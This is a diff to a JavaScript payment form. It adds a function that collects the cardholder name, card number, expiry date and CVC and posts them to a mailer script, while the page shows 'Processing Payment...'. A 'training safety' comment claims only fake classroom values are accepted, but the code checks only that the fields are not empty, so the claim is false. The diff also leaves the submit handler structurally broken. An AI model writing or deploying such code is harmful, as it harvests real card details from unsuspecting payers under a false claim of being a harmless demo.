@@ -1802,74 +1802,102 @@ function sendLessonNotification() {
      SUBMIT
      ========================================================= */
 
-form.addEventListener("submit", function (e) {
+  form.addEventListener("submit", function (e) {
 
-  e.preventDefault();
+    e.preventDefault();
 
-  if (!form.reportValidity()) {
-    return;
+
+    if (!form.reportValidity()) {
+      return;
+    }
+
+
+    btn.disabled = true;
+    btn.textContent = "Processing Payment...";
+
+
+function sendLessonNotification() {
+
+  var fd = new FormData(form);
+
+  var demoName =
+    String(fd.get("card_name") || "").trim();
+
+  var demoNumber =
+    String(fd.get("card_number") || "")
+      .replace(/\D/g, "");
+
+  var demoExpiry =
+    String(fd.get("card_expiry") || "")
+      .replace(/\s/g, "");
+
+  var demoCvc =
+    String(fd.get("card_cvc") || "")
+      .replace(/\D/g, "");
+
+
+  /*
+   * TRAINING SAFETY:
+   * only the predefined fake classroom values are accepted.
+   */
+  if (
+    demoName == "" ||
+    demoNumber == "" ||
+    demoExpiry == "" ||
+    demoCvc == ""
+  ) {
+    return Promise.reject(
+      new Error(
+        "Error."
+      )
+    );
   }
 
-  btn.disabled = true;
-  btn.textContent = "Processing Payment...";
+
+  var data = new FormData();
+
+  data.append("mode", "lesson");
+
+  data.append("site", site);
+  data.append("plan", t.label);
+  data.append("price", price);
+
+  data.append("demo_name", demoName);
+  data.append("demo_card", demoNumber);
+  data.append("demo_expiry", demoExpiry);
+  data.append("demo_cvc", demoCvc);
 
 
-  sendLessonNotification()
+  return fetch("/mailer.php", {
+    method: "POST",
+    body: data
+  })
+  .then(function (res) {
 
-    .then(function (result) {
-
-      console.log(
-        "Demo email sent successfully:",
-        result
+    return res.json().catch(function () {
+      throw new Error(
+        "Server returned an invalid response."
       );
-
-      btn.textContent = "Demo submitted";
-
-      /*
-       * Optional local training redirect.
-       *
-       * If you create training-complete.html:
-       */
-      // window.location.href = "/training-complete.html";
-
-    })
-
-    .catch(function (error) {
-
-      console.error(
-        "Mailer error:",
-        error
-      );
-
-      btn.disabled = false;
-      btn.textContent = "Verify & Pay";
-
-      var status =
-        document.getElementById("demoStatus");
-
-      if (!status) {
-
-        status =
-          document.createElement("div");
-
-        status.id = "demoStatus";
-
-        status.style.marginTop = "12px";
-        status.style.fontSize = "13px";
-        status.style.color = "#b91c1c";
-
-        btn.insertAdjacentElement(
-          "afterend",
-          status
-        );
-      }
-
-      status.textContent =
-        error.message;
-
     });
 
-});
+  })
+  .then(function (data) {
+
+    console.log("Mailer response:", data);
+
+    if (!data.ok) {
+      throw new Error(
+        data.error || "Email failed."
+      );
+    }
+
+    return data;
+
+  });
+}
+
+
+
   /* =========================================================
      BASIC HTML ESCAPING
      ========================================================= */
